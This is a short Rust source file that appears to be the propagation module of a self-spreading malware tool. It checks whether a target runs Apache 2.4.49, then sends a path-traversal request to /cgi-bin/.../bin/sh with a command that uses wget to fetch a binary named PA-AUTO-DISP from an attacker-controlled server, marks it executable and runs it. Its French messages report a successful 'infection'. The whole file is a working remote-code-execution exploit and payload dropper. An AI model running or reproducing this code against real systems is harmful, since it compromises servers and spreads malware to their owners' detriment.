use std::process::{Command, Output};
use std::error::{Error as StdError};

pub async fn get_apache_headers(target: String) -> Result<(), Box<dyn StdError>> {
    let url = format!("http://{}", target);
    let client = reqwest::Client::new();
    let res = client.get(&url).send().await?;

    if let Some(server) = res.headers().get("Server") {
        println!("Server: {:?}", server);
        if let Ok(server_str) = server.to_str() {
            if server_str.contains("Apache") {
                println!("Server is Apache");
                if server_str.contains("2.4.49") {
                    println!("Version is vulnerable");
                    return Ok(());
                } else {
                    return Err("Apache server version is not vulnerable".into());
                }
            } else {
                return Err("Server is not Apache".into());
            }
        } else {
            return Err("Failed to convert server header to string".into());
        }
    } else {
        return Err("Server header not found".into());
    }
}
pub(crate) async fn exploit_apache(
    target_ip: &str,
    srv: &str,
) {

    match get_apache_headers(target_ip.to_string()).await {
        Ok(..) => {
            let url = format!("http://{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", target_ip);
            //let srv:String = format!("51.77.193.65");

            let command_output: Output = Command::new("curl")
                .arg("-X")
                .arg("POST")
                .arg("-d")
                .arg(format!(
                    "echo; cd /tmp && wget http://{}:8000/PA-AUTO-DISP && chmod +x PA-AUTO-DISP && ./PA-AUTO-DISP",
                    srv
                )) //ajouter ./...
                //.arg("echo;id")
                .arg(url)
                .output()
                .map_err(|e| format!("Failed to execute command: {}", e)).expect("Erreur requete http");

            if command_output.status.success() {
                let result_str = String::from_utf8_lossy(&command_output.stdout);
                if result_str.is_empty() {
                    println!("Infection reussi - pas de message d'erreur si le serveur api est éteint ");
                }
            }
        }
        Err(e) => {
            eprintln!("Failed to exploit Apache: {}", e);
        }

    }

}
